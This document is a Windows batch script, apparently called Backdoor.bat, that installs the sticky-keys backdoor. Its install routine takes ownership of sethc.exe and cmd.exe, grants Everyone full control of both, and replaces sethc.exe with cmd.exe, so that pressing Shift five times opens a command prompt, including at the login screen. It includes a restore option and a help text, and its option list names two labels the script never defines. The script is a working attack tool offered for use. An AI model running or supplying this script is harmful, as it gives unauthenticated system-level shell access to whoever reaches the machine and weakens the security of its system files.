@echo off

color 0a
set "ver=1.0"
set "own=takeown"
set "sethdir=C:\Windows\System32\sethc.exe"
set "cmdir=C:\Windows\System32\cmd.exe"

if /i "%1"=="-install" goto :install
if /i "%1"=="-restore" goto :uninstall
if /i "%1"=="-clean" goto :clean
if /i "%1"=="-Desktop" goto :Desktop
if /i "%1"=="ver" echo %ver%&&goto :eof
if /i "%1"=="/h" goto :help
if /i "%1"=="/help" goto help
if /i "%1"=="-h" goto :help

goto :help

:install
takeown /f "%sethdir%"
takeown /f "%cmdir%"
echo ------------------------------------------------------
icacls "C:\Windows\System32\sethc.exe" /grant everyone:F
icacls "C:\Windows\System32\cmd.exe" /grant everyone:F
md "C:/backdoorbackup"
copy "C:\Windows\System32\sethc.exe" "C:/backdoorbackup/sethc.exe"
del "C:\Windows\System32\sethc.exe"
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\sethc.exe"
echo backdoor installed. 
echo press shift five times or (alt+shift+prtsc) to open.
exit /b 0
	


:uninstall
del "C:\Windows\System32\Sethc.exe"
copy "C:\backdoorbackup\Sethc.exe" "C:\Windows\System32"
echo restored original file :sethc.exe to System32 folder
exit /b 0





:help
echo. Backdoor.bat [optional parameter]
echo. 
echo. Parameter List :
echo. 
echo. -install       Installs backdoor cmd
echo.
echo. -restore       restores sethc original file
echo.				 From : [C:/backdoorbackup] to 
echo.				 To   : [C:\Windows\System32]
echo.
echo. example :
echo.
echo. Backdoor.bat -install
echo.          or
echo. Backdoor.bat -restore
:eof